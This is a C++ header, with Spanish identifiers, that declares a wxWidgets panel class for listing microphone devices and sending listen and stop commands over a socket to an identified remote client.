#ifndef __MIC_
#define __MIC_ 1

#include "headers.hpp"

class panelMicrophone : public wxPanel {
public:
    panelMicrophone(wxWindow* pParent, SOCKET sck_socket, std::string strID);

    void ProcesarLista(const char*& pBuffer);

private:

    wxComboBox* mic_devices = nullptr;

    std::string strID = "";
    SOCKET sckSocket = INVALID_SOCKET;
    void OnRefrescarDispositivos(wxCommandEvent& event);
    void OnEscuchar(wxCommandEvent& event);
    void OnDetener(wxCommandEvent& event);

    void EnviarComando(std::string pComando, int iComando);

    wxDECLARE_EVENT_TABLE();
};

#endif
